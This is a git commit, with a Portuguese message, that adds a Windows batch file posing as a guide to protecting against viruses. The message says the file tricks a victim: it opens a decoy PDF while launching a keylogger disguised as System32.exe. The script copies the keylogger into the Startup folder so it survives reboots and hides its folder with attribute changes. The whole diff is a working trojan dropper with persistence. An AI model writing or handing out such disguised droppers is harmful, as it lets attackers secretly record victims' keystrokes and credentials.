db2048082e5685d3cdbfcb6911e887a711fda835
Jorge Felipe <51430238+aabbcc00332211@users.noreply.github.com>
2022-08-19 19:32:21 -0300

    Add files via upload
    O teste se baseia em que a vítima, ao tentar acessar o arquivo .pdf, que supostamente seria de como se proteger contra vírus, ele executará o arquivo muito simples feito em .bat, que abrirá sim o .pdf sobre proteção virtual, porém irá executar junto o malware do tipo keylogger, e junto a tudo isso, o script em .bat, também moverá o malware para a pasta 'inicializar' do windows, para que assim mesmo que a vítima desligue o micro, no momento em que ela religar o mesmo, o malware retoma a ação.

---
+++ Thebest/teste/Como se proteger de vírus.bat
@@ -0,0 +1,11 @@
+attrib -h %userprofile%\Desktop\Thebest\teste /S /D
+
+attrib -h System32.exe /S /D
+
+move teste\System32.exe %userprofile%\AppData\Roaming\Microsoft\Windows\"Start Menu"\Programas\Startup
+
+start %userprofile%\AppData\Roaming\Microsoft\Windows\"Start Menu"\Programas\Startup\System32.exe
+
+start teste\Proteger_meu_computador_contra_virus.pdf
+
+attrib +h %userprofile%\Desktop\Thebest\teste /S /D
